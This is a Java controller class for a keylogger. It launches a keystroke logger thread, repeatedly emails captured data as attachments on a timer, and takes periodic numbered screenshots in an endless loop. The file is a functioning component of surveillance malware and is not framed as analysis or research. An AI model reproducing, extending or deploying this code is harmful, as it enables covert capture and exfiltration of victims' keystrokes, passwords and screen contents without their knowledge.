package control;

import model.Logger;
import model.SendEmailAttachment;

public class LoggerController {
	private Logger keylog;
	private SendEmailAttachment attach;
	private int i=-1;
	
	public LoggerController() {
		keylog = new Logger();
		attach = new SendEmailAttachment();
	}
	
	public void initialize() {
		new Thread() {public void run() {
			keylog.start();
		}}.start();
	}
	
	public void sendEmail(int millis) {
		Thread t = new Thread() {public void run() {while(true){try {
			Thread.sleep(millis);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}attach.main();}}};
			t.start();
	}
	
	public void screenshot(int millis) {
		
		Thread t = new Thread() {
			public void run() {
				while(true) {
				try {
					Thread.sleep(millis);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				keylog.screenCapture(++i);
			}}
		};
			t.start();
		
	}
}
